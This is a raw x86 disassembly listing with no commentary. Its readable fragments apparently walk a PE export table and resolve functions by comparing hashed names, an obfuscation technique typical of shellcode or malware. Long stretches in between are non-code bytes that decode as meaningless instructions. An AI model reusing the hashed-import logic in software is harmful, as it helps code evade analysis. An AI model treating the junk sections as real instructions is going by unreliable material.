  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x4345cb,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x4347d5
  411bfa:	push   0x4347e9
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x4345cb
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x4345cb,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
  411c57:	mov    DWORD PTR [ebp-0x14],ecx
  411c5a:	mov    eax,DWORD PTR [ebp-0x28]
  411c5d:	mov    ecx,DWORD PTR [ebp+0x8]
  411c60:	jmp    0x411e60
  411c65:	scas   al,BYTE PTR es:[edi]
  411c66:	repz push esi
  411c68:	add    dl,BYTE PTR [ebx-0x5d]
  411c6b:	push   0x73
  411c6d:	out    dx,eax
  411c6e:	sub    DWORD PTR [ecx+0x2f],esp
  411c71:	and    eax,0xd5957877
  411c76:	push   esi
  411c77:	jle    0x411cf7
  411c79:	pop    ecx
  411c7a:	jg     0x411cfa
  411c7c:	jle    0x411ce8
  411c7e:	push   es
  411c7f:	dec    edx
  411c80:	dec    ebp
  411c81:	fld    DWORD PTR [ebx]
  411c83:	mov    cl,0x45
  411c85:	adc    al,0x86
  411c87:	cdq    
  411c88:	sub    BYTE PTR [ebp+0x60],dh
  411c8b:	out    dx,al
  411c8c:	test   eax,0x751f16d
  411c91:	punpckhbw mm3,QWORD PTR gs:[ebx+esi*4]
  411c96:	or     DWORD PTR [edi],eax
  411c98:	xlat   BYTE PTR ds:[ebx]
  411c99:	push   edx
  411c9a:	dec    ebx
  411c9b:	inc    ebp
  411c9c:	mov    al,ds:0x1565f756
  411ca1:	xchg   esp,eax
  411ca2:	adc    bh,dl
  411ca4:	gs cli 
  411ca6:	data16 hlt 
  411ca8:	aad    0xeb
  411caa:	mov    ebp,DWORD PTR ds:0xa423143e
  411cb0:	mov    ah,0x50
  411cb2:	cmp    al,0xe2
  411cb4:	inc    ebp
  411cb5:	(bad)  
  411cb6:	test   eax,0xc6c539a3
  411cbb:	mov    BYTE PTR [edx+0x71ba3f88],dh
  411cc1:	cmp    ebp,edx
  411cc3:	cmc    
  411cc4:	cmc    
  411cc5:	rcl    WORD PTR [ecx-0x1c],0x72
  411cca:	push   esp
  411ccb:	xor    edx,DWORD PTR [edi+0x5d]
  411cce:	in     eax,0x87
  411cd0:	repnz inc esi
  411cd2:	test   eax,0xa13d2d63
  411cd7:	push   ebp
  411cd8:	out    dx,al
  411cd9:	mov    ah,0x21
  411cdb:	ins    DWORD PTR es:[edi],dx
  411cdc:	cmp    BYTE PTR [edx],0x1e
  411cdf:	stc    
  411ce0:	mov    al,0xcd
  411ce2:	push   ss
  411ce3:	fs dec BYTE PTR fs:[ebx]
  411ce7:	mov    dh,0xe0
  411ce9:	gs out 0x17,eax
  411cec:	mov    esp,ebp
  411cee:	shl    ecx,0x7
  411cf1:	rcl    DWORD PTR [ebp+0x54],0xa9
  411cf5:	jnp    0x411cb4
  411cf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cf8:	in     al,dx
  411cf9:	lea    esp,[edx]
  411cfb:	jne    0x411d22
  411cfd:	mov    esi,0x7bf13f16
  411d02:	(bad)  [ebp+0x50]
  411d05:	jo     0x411cb3
  411d07:	xchg   edi,eax
  411d08:	push   cs
  411d09:	jmp    0x80ca:0x61ea36ad
  411d10:	lahf   
  411d11:	or     eax,0xc06f71c7
  411d16:	mov    ch,0x43
  411d18:	xchg   ebx,eax
  411d19:	pop    ecx
  411d1a:	dec    esp
  411d1b:	ss aaa 
  411d1d:	stos   BYTE PTR es:[edi],al
  411d1e:	call   0xb2fd:0xcf08c145
  411d25:	or     al,0x1
  411d27:	ret    
  411d28:	cwde   
  411d29:	ror    BYTE PTR [edx-0xd],0xd1
  411d2d:	fwait
  411d2e:	inc    edx
  411d2f:	fldln2 
  411d31:	int    0x73
  411d33:	mov    al,ds:0xdad217ec
  411d38:	ins    DWORD PTR es:[edi],dx
  411d39:	or     BYTE PTR [ebp+0x4b9e3a0],dh
  411d3f:	pop    ss
  411d40:	sub    BYTE PTR [ebp-0x44],0x3e
  411d44:	jns    0x411d84
  411d46:	cmp    al,0x9c
  411d48:	arpl   WORD PTR [edi-0x6a],sp
  411d4b:	mov    ebx,0x5cc7fa35
  411d50:	and    BYTE PTR [ecx+esi*1],bl
  411d53:	adc    ecx,DWORD PTR ds:0x6d0aa289
  411d59:	cmp    BYTE PTR ds:0x15f4d68c,dl
  411d5f:	aas    
  411d60:	mov    WORD PTR [edx+0x284093ce],ds
  411d66:	imul   ebp,DWORD PTR [edi],0x46
  411d69:	inc    ebx
  411d6a:	inc    ebx
  411d6b:	sahf   
  411d6c:	fcmovb st,st(2)
  411d6e:	rol    BYTE PTR ds:0x38dc6dc0,0x13
  411d75:	pop    edi
  411d76:	lods   eax,DWORD PTR ds:[esi]
  411d77:	cli    
  411d78:	mov    dl,0x83
  411d7a:	pop    esi
  411d7b:	into   
  411d7c:	sub    edi,DWORD PTR [esi]
  411d7e:	mov    ah,0xf7
  411d80:	(bad)
  411d84:	call   0xf4f5:0xe6d646b9
  411d8b:	mov    edx,0x5e331b11
  411d90:	lahf   
  411d91:	mov    ds:0x71933def,eax
  411d96:	jl     0x411d44
  411d98:	clc    
  411d99:	not    DWORD PTR [edi-0x39551ac7]
  411d9f:	mov    esp,0xa454bec5
  411da4:	int3   
  411da5:	mov    cl,0x80
  411da7:	pop    esp
  411da8:	imul   edx,DWORD PTR [esi+ebx*1+0x74],0xfffffff9
  411dad:	mov    cl,0xdb
  411daf:	retf   
  411db0:	fwait
  411db1:	or     BYTE PTR ds:0x415ba062,0x6e
  411db8:	lds    eax,FWORD PTR [ebx]
  411dba:	xchg   bl,bl
  411dbc:	push   ss
  411dbd:	inc    ebx
  411dbe:	cli    
  411dbf:	sub    al,0x25
  411dc1:	in     eax,0x1c
  411dc3:	inc    esp
  411dc4:	in     eax,dx
  411dc5:	xchg   esi,esp
  411dc7:	hlt    
  411dc8:	jns    0x411da8
  411dca:	out    0x5c,eax
  411dcc:	shr    DWORD PTR [ebp-0x5312bd5e],1
  411dd2:	cmp    DWORD PTR [ebx+0x3],0x9a4758c6
  411dd9:	sbb    eax,0xe84f5244
  411dde:	out    0x90,eax
  411de0:	repnz test BYTE PTR [ebx+edi*4-0x30227854],dh
  411de8:	mov    ecx,0x1b78fbda
  411ded:	or     eax,0x2fbd4f70
  411df2:	mov    esi,DWORD PTR [ebx+0x48]
  411df5:	sub    ebx,esp
  411df7:	nop
  411df8:	add    ebx,DWORD PTR [esi]
  411dfa:	and    edi,0x4e
  411dfd:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411dff:	ret    
  411e00:	cli    
  411e01:	(bad)  
  411e02:	clc    
  411e03:	and    DWORD PTR [ebp-0x471e5aa7],edx
  411e09:	adc    esi,DWORD PTR [ebx]
  411e0b:	outs   dx,WORD PTR ds:[esi]
  411e0d:	jl     0x411db7
  411e0f:	jecxz  0x411df2
  411e11:	adc    eax,0x5e026b95
  411e16:	xchg   edx,eax
  411e17:	jecxz  0x411dc1
  411e19:	or     eax,0x121b3a85
  411e1e:	push   ebx
  411e1f:	outs   dx,BYTE PTR ds:[esi]
  411e20:	push   ecx
  411e21:	test   al,0xdf
  411e23:	out    dx,al
  411e24:	nop
  411e25:	mov    dl,0x2d
  411e27:	scas   al,BYTE PTR es:[edi]
  411e28:	call   0x529bcb1a
  411e2d:	ins    DWORD PTR es:[edi],dx
  411e2e:	ins    DWORD PTR es:[edi],dx
  411e2f:	jmp    0xfa3d:0x32b5ac29
  411e36:	jns    0x411dde
  411e38:	lahf   
  411e39:	or     al,0x4d
  411e3b:	fist   WORD PTR [ebx+eax*1]
  411e3e:	addr16 popa 
  411e40:	fwait
  411e41:	fwait
  411e42:	xor    al,0xfc
  411e44:	push   es
  411e45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e46:	lods   al,BYTE PTR ds:[esi]
  411e47:	sbb    al,0x32
  411e49:	jl     0x411dce
  411e4b:	adc    esp,DWORD PTR ds:[ecx]
  411e4e:	inc    edx
  411e4f:	mov    bl,0xa5
  411e51:	push   ebx
  411e52:	sub    al,0xbe
  411e55:	dec    eax
  411e56:	enter  0x28f4,0x8c
  411e5a:	pop    ecx
  411e5b:	mov    BYTE PTR ds:0x384a739,al
  411e61:	or     al,0xb8
  411e63:	lea    eax,[ebp-0x8]
  411e66:	mov    DWORD PTR [ebp-0x30],ecx
  411e69:	push   eax
  411e6a:	push   DWORD PTR [ebp-0x30]
  411e6d:	push   DWORD PTR [ebp+0xc]
  411e70:	call   0x402e72
  411e75:	mov    eax,DWORD PTR [ebp-0x4]
  411e78:	mov    ecx,DWORD PTR [ebp-0x8]
  411e7b:	xor    eax,0x7510851
  411e80:	add    eax,ebx
  411e82:	cmp    ecx,eax
  411e84:	jne    0x411ea7
  411e8a:	mov    eax,DWORD PTR [ebp-0x20]
  411e8d:	inc    edi
  411e8e:	cmp    edi,eax
  411e90:	jb     0x411a92
  411e96:	jmp    0x4122b7
  411e9b:	mov    eax,DWORD PTR [ebp-0x4]
  411e9e:	xor    eax,esi
  411ea0:	add    eax,ebx
  411ea2:	jmp    0x412c05
  411ea7:	mov    eax,DWORD PTR [ebp-0x2c]
  411eaa:	movzx  eax,WORD PTR [eax+edi*2]
  411eae:	jmp    0x4120ae
  411eb3:	retf   
  411eb4:	dec    ebp
  411eb5:	add    DWORD PTR [edi+0x6d757391],esi
  411ebb:	je     0x411ea0
  411ebd:	jge    0x411f08
  411ebf:	in     al,0x5
  411ec1:	cmp    BYTE PTR ds:0x7e7e5030,0x59
  411ec8:	jg     0x411f48
  411eca:	jle    0x411f28
  411ecc:	not    BYTE PTR [edi]
  411ece:	push   esi
  411ecf:	cmp    BYTE PTR [ecx-0x35],ah
  411ed2:	stos   DWORD PTR es:[edi],eax
  411ed3:	out    0xe4,al
  411ed5:	addr16 adc eax,0xb6bf3a9c
  411edb:	ins    DWORD PTR es:[edi],dx
  411edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411edd:	and    ebx,edx
  411edf:	or     BYTE PTR [ebp-0x10],bh
  411ee2:	inc    eax
  411ee3:	cld    
  411ee4:	leave  
  411ee5:	rol    BYTE PTR [ebx-0x76],1
  411ee8:	pop    esi
  411ee9:	adc    BYTE PTR [ebx],bl
  411eeb:	jae    0x411f15
  411eed:	and    eax,0x2c261bdc
  411ef2:	stc    
  411ef3:	fs test al,0xc0
  411ef6:	fwait
  411ef7:	jge    0x411f49
  411ef9:	pop    ss
  411efa:	imul   esi,ebp,0xfffffff6
  411efd:	popa   
  411efe:	arpl   dx,si
  411f00:	sti    
  411f01:	adc    ch,BYTE PTR [edi+0x63f5837e]
  411f07:	cmp    BYTE PTR [ebx+0x3a557e64],dl
  411f0d:	push   esp
  411f0e:	call   0x42d6:0xb406769
  411f15:	mov    esi,0xbc73f0e1
  411f1a:	cli    
  411f1b:	dec    edi
  411f1c:	xor    ebx,eax
  411f1e:	ret    0xad78
  411f21:	and    al,0x67
  411f23:	push   0xffffffc4
  411f25:	test   DWORD PTR [ecx+0x43],eax
  411f28:	(bad)  
  411f29:	adc    ch,ah
  411f2b:	adc    BYTE PTR [eax+eax*8-0x43bd7cb3],bl
  411f32:	idiv   ecx
  411f34:	imul   edi
  411f36:	xchg   esi,eax
  411f37:	(bad)  
  411f38:	add    BYTE PTR [esi+0x5c],ah
  411f3b:	jecxz  0x411fb7
  411f3d:	in     eax,dx
  411f3e:	or     ecx,DWORD PTR cs:[edx-0x55]
  411f42:	ret    
  411f43:	fisub  WORD PTR [ebx+0x16ec60a7]
  411f49:	mov    esi,0x324b766d
  411f4e:	and    eax,DWORD PTR [ebx]
  411f50:	pop    es
  411f51:	push   0x60
  411f53:	retf   
  411f54:	and    DWORD PTR [ecx-0x15ad36b0],ebx
  411f5a:	pop    eax
  411f5b:	add    eax,0xc181503d
  411f60:	push   0xc0e299c3
  411f65:	das    
  411f66:	pop    ebp
  411f67:	cli    
  411f68:	xor    bl,bl
  411f6a:	popf   
  411f6b:	cmp    al,BYTE PTR [ecx]
  411f6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f6e:	gs adc eax,0xabd62c02
  411f74:	sub    cl,ch
  411f76:	xor    bx,WORD PTR [ebx+0xa0496d1]
  411f7d:	inc    edx
  411f7e:	lods   al,BYTE PTR ds:[esi]
  411f7f:	jne    0x411fb3
  411f81:	xchg   edi,eax
  411f82:	jle    0x411f96
  411f84:	inc    ebx
  411f85:	(bad)  
  411f87:	fisttp DWORD PTR [eax-0x8]
  411f8a:	pop    esp
  411f8b:	and    al,0xe3
  411f8d:	jmp    0x5ec1a585
  411f92:	add    al,0x54
  411f94:	hlt    
  411f95:	clc    
  411f96:	jmp    0x69f5:0xe87a6aa9
  411f9d:	je     0x411f7c
  411f9f:	icebp  
  411fa0:	and    DWORD PTR [edi-0x79e2a3bf],0x1e
  411fa7:	aad    0xe6
  411fa9:	ja     0x411ff7
  411fab:	cld    
  411fac:	sub    al,BYTE PTR [edx]
  411fae:	scas   al,BYTE PTR es:[edi]
  411faf:	(bad)  
  411fb0:	out    0x76,al
  411fb2:	lds    ebp,FWORD PTR [ebp-0x680d213d]
  411fb8:	mov    ch,0x50
  411fba:	scas   al,BYTE PTR es:[edi]
  411fbb:	mov    bh,0x43
  411fbd:	shr    dh,0x87
  411fc0:	adc    dl,BYTE PTR [esi]
  411fc2:	lea    esi,[esi]
  411fc4:	out    dx,al
  411fc5:	mov    eax,DWORD PTR [edi]
  411fc7:	push   edx
  411fc8:	mov    al,ds:0x28e074e9
  411fcd:	and    eax,0x6e93d4db
  411fd2:	shl    BYTE PTR [ebx],0x2f
  411fd5:	adc    ch,dh
  411fd7:	mov    ss,WORD PTR [esi+ecx*2+0x33abe1e9]
  411fde:	inc    ecx
  411fdf:	push   ecx
  411fe0:	mov    cl,0x43
  411fe2:	jne    0x41204f
  411fe4:	mov    WORD PTR [edx+0x1e271477],gs
  411fea:	jmp    0x412016
  411fec:	sbb    eax,0x82028182
  411ff1:	fmul   QWORD PTR [esp+esi*1-0x296d5b6c]
  411ff8:	mov    BYTE PTR [edx-0x2310a904],bh
  411ffe:	scas   al,BYTE PTR es:[edi]
  411fff:	pop    eax
  412000:	ds inc ecx
  412002:	or     al,0xc2
  412004:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412005:	and    al,BYTE PTR [eax-0x6f]
  412008:	sub    esp,eax
  41200a:	jmp    0x412034
  41200c:	push   0x1f
  41200e:	cmp    BYTE PTR [edi],dh
  412010:	mov    al,0xe4
  412012:	jg     0x412048
  412014:	psllq  mm4,QWORD PTR [ebx]
  412017:	ds retf 0x3ff4
  41201b:	pop    eax
  41201c:	stc    
  41201d:	fiadd  WORD PTR [edx+0x777045a9]
  412023:	loope  0x412085
  412025:	retf   0x9693
  412028:	sub    ebp,ebx
  41202a:	and    DWORD PTR [eax+0x68],eax
  41202d:	(bad)  
  41202e:	pop    esp
  41202f:	stos   DWORD PTR es:[edi],eax
  412030:	loop   0x411fb8
  412032:	stos   DWORD PTR es:[edi],eax
  412033:	sub    ebp,DWORD PTR [esi]
  412035:	jbe    0x411fdf
  412037:	sbb    al,0xbe
  412039:	fistp  DWORD PTR [ecx+0x31cb638a]
  41203f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412040:	add    BYTE PTR [edi-0x3b88bb96],dl
  412046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412047:	mov    al,0x76
  412049:	push   0x533905c7
  41204e:	push   ecx
  41204f:	arpl   WORD PTR [ecx+edi*4+0x47],di
  412053:	icebp  
  412054:	fsubr  QWORD PTR [ecx+ecx*4+0x65]
  412058:	dec    esp
  412059:	mov    edx,0xe221ed3a
  41205e:	inc    edi
  41205f:	les    eax,FWORD PTR [ebx-0x7f]
  412062:	(bad)  
  412063:	jns    0x412052
  412065:	daa    
  412066:	lds    esi,FWORD PTR [esi+0x59]
  412069:	mov    eax,ds:0x7e2e80ac
  41206e:	xchg   esp,eax
  41206f:	pop    esi
  412070:	inc    ebx
  412071:	ins    DWORD PTR es:[edi],dx
  412072:	cli    
  412073:	ja     0x41209d
  412075:	push   0x8ab9a001
  41207a:	inc    ebp
  41207b:	in     eax,0xec
  41207d:	stc    
  41207e:	cld    
  41207f:	and    DWORD PTR [ebx+0x26e9f982],esi
  412085:	fdiv   DWORD PTR [edi]
  412087:	jno    0x4120df
  412089:	dec    esi
  41208a:	(bad)  
  41208b:	fstp   DWORD PTR [esi+0x741ffc47]
  412091:	iret   
  412092:	add    al,0xac
  412094:	and    al,0xc7
  412096:	adc    al,0xfd
  412098:	push   cs
  412099:	lods   al,BYTE PTR ds:[esi]
  41209a:	cdq    
  41209b:	mov    esp,ecx
  41209d:	sbb    DWORD PTR [ebx-0x61b10e1e],eax
  4120a3:	fsubr  QWORD PTR [ebx+eax*1]
  4120a6:	sub    DWORD PTR [eax-0x6d4e270b],edx
  4120ac:	dec    esp
  4120ad:	call   0x8104:0x8bec4d8b
  4120b4:	jmp    0x4122b4
  4120b9:	cmp    DWORD PTR [ecx+ebx*4+0x69156508],esp
  4120c0:	jne    0x4120eb
  4120c2:	xchg   edx,eax
  4120c3:	mov    al,0xd4
  4120c5:	mov    BYTE PTR [edx+0x521378de],ch
  4120cb:	jle    0x41214b
  4120cd:	pop    ecx
  4120ce:	jg     0x41214e
  4120d0:	jle    0x412092
  4120d2:	mov    ebx,0x3c5fd53e
  4120d7:	test   BYTE PTR [esi+0x46],ah
  4120da:	jns    0x4120c6
  4120dc:	xchg   esp,eax
  4120dd:	pushf  
  4120de:	xchg   ebx,eax
  4120df:	xor    DWORD PTR [ebx+0x534b3416],esp
  4120e5:	add    edx,ebx
  4120e7:	pop    ds
  4120e8:	clc    
  4120e9:	sub    BYTE PTR [ebp-0x2bc45621],cl
  4120ef:	push   ebp
  4120f0:	int    0xb5
  4120f2:	mov    esp,0x26abcea0
  4120f7:	ret    
  4120f8:	ret    
  4120f9:	out    dx,eax
  4120fa:	aaa    
  4120fb:	jnp    0x41211a
  4120fd:	inc    esp
  4120fe:	(bad)  
  4120ff:	jmp    0xbee84498
  412104:	fidiv  DWORD PTR ds:0xccfc2dc1
  41210a:	push   ds
  41210b:	fnstenv [ebx+0x7a]
  41210e:	sahf   
  41210f:	ret    0xa7d6
  412112:	adc    eax,DWORD PTR [esi-0x10d493e2]
  412118:	dec    ebp
  412119:	mov    dl,0xcd
  41211b:	in     al,dx
  41211c:	out    0x7e,al
  41211e:	test   eax,0x10e9f509
  412123:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412125:	imul   ebx,edi,0x9f3c54e1
  41212b:	inc    ebx
  41212c:	jno    0x4120d9
  41212e:	mov    edx,0x5fcaeba1
  412133:	inc    edx
  412134:	pop    esi
  412135:	adc    al,0x6b
  412137:	cld    
  412138:	jmp    DWORD PTR [eax+edx*1]
  41213b:	inc    eax
  41213c:	scas   al,BYTE PTR es:[edi]
  41213d:	mov    es,edx
  41213f:	adc    ebp,DWORD PTR [edi+0x531c138f]
  412145:	fmul   QWORD PTR ds:0x422882e1
  41214b:	push   0x5e
  41214d:	jne    0x4120d9
  41214f:	fidivr WORD PTR [ecx+0x7e]
  412152:	ins    BYTE PTR es:[edi],dx
  412153:	jle    0x412164
  412155:	lods   eax,DWORD PTR ds:[esi]
  412156:	sbb    DWORD PTR [ebx+0x70],ecx
  412159:	or     BYTE PTR [edi],bh
  41215b:	adc    esp,ecx
  41215d:	into   
  41215e:	daa    
  41215f:	retf   
  412160:	iret   
  412161:	mov    ?,WORD PTR [esi-0x13]
  412164:	adc    DWORD PTR [edi],esp
  412166:	push   es
  412167:	pop    es
  412168:	and    ecx,esp
  41216a:	push   edx
  41216b:	ja     0x412148
  41216d:	jg     0x4120f8
  41216f:	cmp    bl,BYTE PTR ds:0xe50414ff
  412175:	das    
  412176:	scas   al,BYTE PTR es:[edi]
  412177:	fwait
  412178:	xor    DWORD PTR [eax-0x12eba403],0x817f421e
  412182:	cli    
  412183:	das    
  412184:	sar    BYTE PTR [eax],1
  412186:	mov    ebx,0x41a2f112
  41218b:	mov    eax,0xdef211b1
  412190:	fisub  DWORD PTR [edi+0x67]
  412193:	inc    esi
  412194:	cmp    BYTE PTR [esi+0x77],0xdb
  412198:	add    al,0x3d
  41219a:	in     eax,dx
  41219b:	int3   
  41219c:	out    dx,al
  41219d:	sub    cl,BYTE PTR [esi]
  41219f:	loop   0x41216a
  4121a1:	test   al,0x2f
  4121a3:	jnp    0x4121b8
  4121a5:	push   esi
  4121a6:	mov    esi,0xf8ccfa38
  4121ab:	aam    0x28
  4121ad:	lds    edx,FWORD PTR [esi+0x2bcce3bc]
  4121b3:	fisubr WORD PTR [eax-0x249ed328]
  4121b9:	scas   eax,DWORD PTR es:[edi]
  4121ba:	jg     0x4121f6
  4121bc:	fsubrp st(4),st
  4121be:	(bad)  
  4121bf:	lahf   
  4121c0:	stos   DWORD PTR es:[edi],eax
  4121c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c2:	fisub  DWORD PTR [esi]
  4121c4:	pop    ecx
  4121c5:	aas    
  4121c6:	inc    ecx
  4121c7:	sub    al,0x18
  4121c9:	pop    ebx
  4121ca:	mov    eax,0x721c5766
  4121cf:	lea    eax,[esi]
  4121d1:	or     eax,0x3634b4ff
  4121d6:	mov    bh,0x3e
  4121d8:	jge    0x4121a6
  4121da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121db:	xchg   edi,eax
  4121dc:	fild   DWORD PTR [esi+0x22]
  4121df:	pop    ss
  4121e0:	mov    al,0x7a
  4121e2:	mov    dh,0x48
  4121e4:	mov    es,WORD PTR [edx+0x15]
  4121e7:	mov    ecx,0x5d219f4f
  4121ec:	loop   0x412211
  4121ee:	rol    dl,cl
  4121f0:	loope  0x412248
  4121f2:	inc    ebp
  4121f3:	ret    0x3072
  4121f6:	mov    edx,0xf6c7061b
  4121fb:	cmp    al,0xae
  4121fd:	aam    0xd3
  4121ff:	xlat   BYTE PTR ds:[ebx]
  412200:	mov    esi,0x95c752b5
  412205:	dec    ebx
  412206:	sub    al,BYTE PTR [eax+edx*8-0x7c]
  41220a:	test   BYTE PTR [edx+ebp*2-0x1],dl
  41220e:	push   ecx
  41220f:	repz jge 0x4121c7
  412212:	or     eax,0xc8fc4c69
  412217:	clc    
  412218:	mov    edx,0xff9e17c2
  41221d:	xor    BYTE PTR [esi],al
  41221f:	icebp  
  412220:	pop    edx
  412221:	xor    BYTE PTR [esi+0x2a],cl
  412224:	int3   
  412225:	sbb    eax,0x2981eadf
  41222a:	lds    ebp,FWORD PTR [edi+ecx*2]
  41222d:	test   BYTE PTR [edi+0x46],0xb1
  412231:	fisttp DWORD PTR [edi-0x16]
  412234:	fld    QWORD PTR [edx]
  412236:	pop    eax
  412237:	pop    eax
  412238:	pop    ds
  412239:	xor    al,0x0
  41223b:	push   cs
  41223c:	cmp    esi,ebx
  41223e:	std    
  41223f:	jecxz  0x412247
  412241:	mov    esp,es
  412243:	ins    DWORD PTR es:[edi],dx
  412244:	aaa    
  412245:	jge    0x412241
  412247:	into   
  412248:	xlat   BYTE PTR ds:[ebx]
  412249:	adc    eax,DWORD PTR [edi+0x1f]
  41224c:	push   cs
  41224d:	push   esi
  41224e:	sar    edi,0xcd
  412251:	mov    ebp,0x6db544c
  412256:	int    0xe9
  412258:	rcr    DWORD PTR [ecx],cl
  41225a:	and    al,0x60
  41225c:	jl     0x41224e
  41225e:	mov    al,ds:0xe05f3cc9
  412263:	jle    0x4122be
  412265:	in     al,0x4b
  412267:	outs   dx,DWORD PTR ds:[esi]
  412268:	jbe    0x412258
  41226a:	std    
  41226b:	or     eax,0x15651337
  412270:	test   BYTE PTR [esi+ecx*1-0x20],dl
  412274:	fiadd  DWORD PTR [ebx]
  412276:	lea    ebp,[edx]
  412278:	inc    eax
  412279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41227a:	jbe    0x412201
  41227c:	and    BYTE PTR [eax+ebx*8+0x3b],dl
  412280:	gs leave 
  412282:	sbb    eax,0x9aacd63f
  412287:	sbb    BYTE PTR [ebx],al
  412289:	lds    ecx,FWORD PTR [ebx+0x50391621]
  41228f:	ins    DWORD PTR es:[edi],dx
  412290:	nop
  412291:	fs pusha 
  412293:	pop    es
  412294:	aas    
  412295:	repnz dec ebx
  412297:	test   BYTE PTR ds:0x9d12637c,0x6
  41229e:	daa    
  41229f:	pop    ebx
  4122a0:	pop    esp
  4122a1:	gs dec edi
  4122a3:	sub    dh,BYTE PTR [esi]
  4122a5:	(bad)  
  4122a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122a7:	int3   
  4122a8:	aas    
  4122a9:	adc    BYTE PTR [eax-0x2327fb48],bh
  4122af:	xor    bl,BYTE PTR [edx+esi*4-0x30]
  4122b3:	mov    al,ds:0x8b0c4589
  4122b8:	inc    ebp
  4122b9:	cld    
  4122ba:	mov    ecx,DWORD PTR [ebp-0x8]
  4122bd:	xor    eax,0x7510851
  4122c2:	add    eax,ebx
  4122c4:	cmp    ecx,eax
  4122c6:	jne    0x4122d9
  4122cc:	mov    eax,DWORD PTR [ebp-0x4]
  4122cf:	xor    eax,0x7510851
  4122d4:	jmp    0x411ea0
  4122d9:	mov    eax,DWORD PTR [ebp+0xc]
  4122dc:	jmp    0x4124dc
  4122e1:	xchg   DWORD PTR [eax],esp
  4122e3:	aam    0x43
  4122e5:	jne    0x41235a
  4122e7:	xchg   ecx,eax
  4122e8:	in     al,dx
  4122e9:	sub    BYTE PTR [ebx-0x1449ec13],ch
  4122ef:	hlt    
  4122f0:	adc    edi,DWORD PTR [esi+0x5c]
  4122f3:	jle    0x412373
  4122f5:	pop    ecx
  4122f6:	jg     0x412376
  4122f8:	jle    0x412370
  4122fa:	ret    
  4122fb:	retf   0xd3d3
  4122fe:	add    ch,BYTE PTR [esi]
  412300:	jno    0x41231f
  412302:	ret    
  412303:	cmp    eax,0x3f803357
  412308:	adc    BYTE PTR [ebx],0x53
  41230b:	mov    BYTE PTR [esi-0x5d5466c],bl
  412311:	and    BYTE PTR [esi],dl
  412313:	sbb    al,0xd
  412315:	nop
  412316:	jle    0x4122c5
  412318:	test   eax,0xf9bce617
  41231d:	call   FWORD PTR [edx+0x232d09f3]
  412323:	xchg   ebx,eax
  412324:	dec    edi
  412325:	and    al,BYTE PTR [esi-0x43]
  412328:	dec    ecx
  412329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41232a:	jns    0x412324
  41232c:	ss jecxz 0x412353
  41232f:	xchg   edx,eax
  412330:	push   eax
  412331:	add    DWORD PTR [ecx-0x3e],edx
  412334:	ja     0x412359
  412336:	mov    ebp,0x86efefbc
  41233b:	rol    BYTE PTR [ecx-0x7c541ca9],1
  412341:	mov    al,0x4c
  412343:	mov    ecx,0x83bdeaba
  412348:	jb     0x41234c
  41234a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41234b:	push   ds
  41234c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41234d:	ror    DWORD PTR [edx],0x40
  412350:	gs scas eax,DWORD PTR es:[edi]
  412352:	test   esp,esp
  412354:	xchg   ebp,eax
  412355:	push   esp
  412356:	aaa    
  412357:	fwait
  412358:	stos   BYTE PTR es:[edi],al
  412359:	or     esi,DWORD PTR [edx+eax*1]
  41235c:	push   eax
  41235d:	scas   eax,DWORD PTR es:[edi]
  41235e:	test   al,0x6b
  412360:	mov    edx,0x93c1e447
  412365:	(bad)  
  412366:	xlat   BYTE PTR ds:[ebx]
  412367:	hlt    
  412368:	mov    bl,0x17
  41236a:	loope  0x412342
  41236c:	bound  ecx,QWORD PTR [edi+0x2a]
  41236f:	stc    
  412370:	daa    
  412371:	push   esi
  412372:	cmc    
  412373:	scas   eax,DWORD PTR es:[edi]
  412374:	test   esp,ebx
  412376:	sub    bl,BYTE PTR [eax-0x63]
  412379:	push   ss
  41237a:	inc    eax
  41237c:	test   eax,0xa22a7e12
  412381:	push   ecx
  412382:	mov    fs,ecx
  412384:	arpl   WORD PTR [esi-0x15],bx
  412387:	adc    BYTE PTR [eax-0x3],bh
  41238a:	sbb    esp,DWORD PTR [edi+0x1d8f960b]
  412390:	stos   DWORD PTR es:[edi],eax
  412391:	push   edx
  412392:	scas   al,BYTE PTR es:[edi]
